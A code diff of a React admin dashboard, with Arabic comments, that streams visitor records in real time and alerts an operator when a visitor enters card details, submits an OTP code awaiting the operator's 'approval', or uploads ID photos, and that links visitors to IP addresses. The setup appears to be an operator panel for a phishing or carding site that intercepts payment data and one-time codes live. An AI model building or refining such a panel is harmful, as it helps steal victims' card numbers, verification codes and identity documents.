@@ -87,6 +87,20 @@ const DashboardApplications = () => {
   const { onlineUsers } = usePresence();
   const previousStepsRef = useRef<Map<string, string>>(new Map());
 
+  // تتبع الإشعارات المُرسلة لتفادي التكرار
+  const notifiedRef = useRef<Set<string>>(new Set());
+
+  const triggerNotification = (key: string, soundFn: () => void, title: string, description: string, duration = 8000) => {
+    // منع الإشعارات المكررة لنفس الحدث
+    if (notifiedRef.current.has(key)) return;
+    notifiedRef.current.add(key);
+    // مسح الإشعار بعد دقيقة للسماح بإشعار جديد لاحقاً
+    setTimeout(() => notifiedRef.current.delete(key), 60000);
+    
+    soundFn();
+    sonnerToast(title, { description, duration });
+  };
+
   useEffect(() => {
     const checkAuth = async () => {
       const { data: { session } } = await supabase.auth.getSession();
@@ -101,7 +115,7 @@ const DashboardApplications = () => {
     checkAuth();
 
     const channel = supabase
-      .channel('applications_changes')
+      .channel('applications_realtime_v2')
       .on(
         'postgres_changes',
         {
@@ -114,92 +128,73 @@ const DashboardApplications = () => {
           
           if (payload.eventType === 'INSERT') {
             const newData = payload.new as Application;
-            // إضافة السجل الجديد مباشرة بدون إعادة جلب كل البيانات
-            setApplications(prev => [newData, ...prev]);
+            setApplications(prev => {
+              // تجنب إضافة نفس السجل مرتين
+              if (prev.some(a => a.id === newData.id)) return prev;
+              return [newData, ...prev];
+            });
             previousStepsRef.current.set(newData.id, newData.current_step);
             
+            const clientName = newData.full_name || 'غير معروف';
             if (newData.current_step === 'quote_form') {
-              playQuoteFormSound();
-              toast({
-                title: "📋 عميل جديد بدأ التسجيل!",
-                description: `العميل ${newData.full_name || 'غير معروف'} أكمل الصفحة الأولى`,
-                duration: 8000,
-              });
-            }
-            if (newData.current_step === 'payment' && !newData.payment_approved) {
-              playNotificationSound();
-              toast({
-                title: "🔔 طلب جديد يحتاج موافقة!",
-                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة الدفع`,
-                duration: 10000,
-              });
-            }
-            if (newData.current_step === 'otp' && !newData.otp_approved) {
-              playOTPSound();
-              toast({
-                title: "🔐 كود تحقق OTP جديد!",
-                description: `العميل ${newData.full_name || 'غير معروف'} أرسل كود التحقق — يحتاج موافقتك`,
-                duration: 10000,
-              });
-            }
-            if (newData.current_step === 'id_verification' && newData.id_verification_step === 'submitted') {
-              playIDVerificationSound();
-              toast({
-                title: "🪪 صور هوية جديدة!",
-                description: `العميل ${newData.full_name || 'غير معروف'} رفع صور هويته — يحتاج مراجعتك`,
-                duration: 10000,
-              });
+              triggerNotification(`quote_${newData.id}`, playQuoteFormSound, "📋 عميل جديد بدأ التسجيل!", `العميل ${clientName} أكمل الصفحة الأولى`);
+            } else if (newData.current_step === 'payment' && !newData.payment_approved) {
+              triggerNotification(`pay_${newData.id}`, playNotificationSound, "🔔 طلب جديد يحتاج موافقة!", `العميل ${clientName} وصل لمرحلة الدفع`, 10000);
+            } else if (newData.current_step === 'otp' && !newData.otp_approved) {
+              triggerNotification(`otp_${newData.id}`, playOTPSound, "🔐 كود تحقق OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000);
+            } else if (newData.current_step === 'id_verification' && newData.id_verification_step === 'submitted') {
+              triggerNotification(`id_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000);
             }
           } else if (payload.eventType === 'UPDATE') {
             const newData = payload.new as Application;
             const previousStep = previousStepsRef.current.get(newData.id);
             
-            // تحديث السجل مباشرة في الـ state بدون إعادة جلب
+            // تحديث السجل في الـ state
             setApplications(prev =>
               prev.map(app => app.id === newData.id ? { ...app, ...newData } : app)
             );
-
-            // تحديث selectedApp إذا كان مفتوحاً
             setSelectedApp(prev => prev?.id === newData.id ? { ...prev, ...newData } : prev);
 
-            if (previousStep && previousStep !== newData.current_step) {
-              playPageChangeSound();
-              toast({
-                title: "📍 العميل انتقل لصفحة جديدة",
-                description: `${newData.full_name || 'عميل'} انتقل إلى ${getPageName(newData.current_step)}`,
-                duration: 5000,
-              });
-            }
-            previousStepsRef.current.set(newData.id, newData.current_step);
+            const clientName = newData.full_name || 'عميل';
 
-            if (newData.current_step === 'payment' && !newData.payment_approved) {
-              playNotificationSound();
-              toast({
-                title: "🔔 طلب جديد يحتاج موافقة!",
-                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة الدفع`,
-                duration: 10000,
-              });
+            // إشعار تغيير الصفحة فقط إذا تغيرت الخطوة فعلاً
+            if (previousStep && previousStep !== newData.current_step) {
+              triggerNotification(
+                `step_${newData.id}_${newData.current_step}`,
+                playPageChangeSound,
+                "📍 العميل انتقل لصفحة جديدة",
+                `${clientName} انتقل إلى ${getPageName(newData.current_step)}`,
+                5000
+              );
+
+              // إشعار خاص عند وصول خطوة جديدة (بعد تأكيد تغيير الخطوة)
+              if (newData.current_step === 'payment' && !newData.payment_approved) {
+                setTimeout(() => triggerNotification(`pay_${newData.id}`, playNotificationSound, "🔔 يحتاج موافقة الدفع!", `العميل ${clientName} أدخل بيانات البطاقة`, 10000), 600);
+              } else if (newData.current_step === 'otp' && !newData.otp_approved) {
+                setTimeout(() => triggerNotification(`otp_${newData.id}`, playOTPSound, "🔐 كود OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000), 600);
+              } else if (newData.current_step === 'id_verification' && newData.id_verification_step === 'submitted') {
+                setTimeout(() => triggerNotification(`id_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000), 600);
+              }
+            } else if (previousStep === newData.current_step) {
+              // نفس الخطوة لكن تحديث البيانات (مثل إرسال OTP أو الهوية)
+              if (newData.current_step === 'otp' && newData.otp_code && !newData.otp_approved) {
+                triggerNotification(`otp_code_${newData.id}_${newData.otp_code}`, playOTPSound, "🔐 كود OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000);
+              }
+              if (newData.id_verification_step === 'submitted') {
+                triggerNotification(`id_submit_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000);
+              }
+              if (newData.current_step === 'payment' && newData.card_number && !newData.payment_approved) {
+                triggerNotification(`pay_card_${newData.id}_${newData.card_last_4}`, playNotificationSound, "🔔 بيانات دفع جديدة!", `العميل ${clientName} أدخل بيانات البطاقة`, 10000);
+              }
             }
-            if (newData.current_step === 'otp' && !newData.otp_approved) {
-              playOTPSound();
-              toast({
-                title: "🔐 كود تحقق OTP جديد!",
-                description: `العميل ${newData.full_name || 'غير معروف'} أرسل كود التحقق — يحتاج موافقتك`,
-                duration: 10000,
-              });
-            }
-            if (newData.id_verification_step === 'submitted') {
-              playIDVerificationSound();
-              toast({
-                title: "🪪 صور هوية جديدة!",
-                description: `العميل ${newData.full_name || 'غير معروف'} رفع صور هويته — يحتاج مراجعتك`,
-                duration: 10000,
-              });
-            }
+
+            previousStepsRef.current.set(newData.id, newData.current_step);
           }
         }
       )
-      .subscribe();
+      .subscribe((status) => {
+        console.log('Realtime subscription status:', status);
+      });
 
     return () => {
       supabase.removeChannel(channel);
@@ -394,26 +389,21 @@ const DashboardApplications = () => {
   };
 
   const fetchApplicationIPs = async (apps: Application[]) => {
-    const phones = apps.map(app => app.phone).filter(Boolean);
-    if (phones.length === 0) return;
+    if (apps.length === 0) return;
 
-    // جلب آخر IP لكل طلب من page_views
+    // جلب آخر 500 سجل فقط لتسريع الاستعلام
     const { data: pageViews, error } = await supabase
       .from('page_views')
-      .select('visitor_id, ip_address, created_at')
+      .select('visitor_id, ip_address')
       .not('ip_address', 'is', null)
-      .order('created_at', { ascending: false });
+      .order('created_at', { ascending: false })
+      .limit(500);
 
     if (error) {
       console.error('Error fetching IPs:', error);
       return;
     }
 
-    // إنشاء خريطة للـ IPs
-    const ipMap = new Map<string, string>();
-    
-    // ربط الـ visitor_id مع الطلبات
-    // نستخدم أول ظهور للـ IP لكل visitor
     const visitorIPs = new Map<string, string>();
     pageViews?.forEach(pv => {
       if (pv.ip_address && !visitorIPs.has(pv.visitor_id)) {
@@ -421,7 +411,6 @@ const DashboardApplications = () => {
       }
     });
 
-    // حفظ الـ IPs
     setApplicationIPs(visitorIPs);
   };
 
